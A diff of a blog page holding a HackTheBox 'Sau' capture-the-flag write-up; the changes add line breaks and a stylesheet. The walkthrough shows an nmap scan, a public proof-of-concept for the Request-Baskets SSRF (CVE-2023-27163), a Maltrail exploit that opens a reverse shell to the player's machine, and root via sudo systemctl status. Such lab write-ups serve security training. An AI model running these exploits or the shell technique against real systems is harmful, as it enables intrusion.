@@ -9,16 +9,16 @@ thumb: /assets/images/logos/1ea2980b9dc2d11cf6a3f82f10ba8702.webp
 # Sau
 
 HackTheBox: Medium
-
+<br/><br/>
 <aside>
 💡 Sau is a medium linux machine which exploit vulnerabilities due to older versions
 
 </aside>
-
+<br/><br/>
 ## 1: Enumeration
-
+<br/><br/>
 - Scanning ports
-
+<br/><br/>
 ```bash
 $ sudo nmap -n -Pn -p- 10.129.229.26
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 21:32 PDT
@@ -33,11 +33,11 @@ PORT      STATE    SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 1388.12 seconds
 ```
-
+<br/><br/>
 We have a web service at 55555 it allows inspect and depure http requests 
-
+<br/><br/>
 It is vulnerable to (CVE-2023-27163) 
-
+<br/><br/>
 ```bash
 $ ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
 Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at https://github.com/entr0pie/CVE-2023-27163
@@ -47,17 +47,17 @@ Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163) || More info at htt
 > Accessing http://10.10.11.234:55555/xsikpk now makes the server request to http://127.0.0.1:80.
 > Authorization: FfWcOUyPi4nGFDSfzSDz_9NrvirREpBzXqJQoiy0-2DqK5NM
 ```
-
+<br/><br/>
 That POC make a reques to 80 port and we can get to it
-
+<br/><br/>
 ## 2: User flag
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c/6fd0d9dd-d49e-4e79-91de-37466e0d34f5-export-216ae02a-fe78-48b7-9c84-c96a4313992c_Untitled.png' | relative_url }})
-
+<br/><br/>
 We find a Maltrail service running with an unprotected version
-
+<br/><br/>
 We find another POC 
-
+<br/><br/>
 ```bash
 $ python3 exploit.py 10.10.14.246 4444 http://10.10.11.234:55555/sbqmby
 Running exploit on http://10.10.11.234:55555/sbqmby
@@ -71,11 +71,11 @@ $ whoami
 whoami
 puma
 ```
-
+<br/><br/>
 ## 3: Priv esc
-
+<br/><br/>
 Check for privileges
-
+<br/><br/>
 ```bash
 $ sudo -l
 sudo -l
@@ -86,9 +86,9 @@ Matching Defaults entries for puma on sau:
 User puma may run the following commands on sau:
     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
 ```
-
+<br/><br/>
 It appears that we are able to examine the trail.service's status.
-
+<br/><br/>
 ```bash
 sudo /usr/bin/systemctl status
 
@@ -99,5 +99,8 @@ while it load
 We are root
 
 ```
-
+<br/><br/>
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
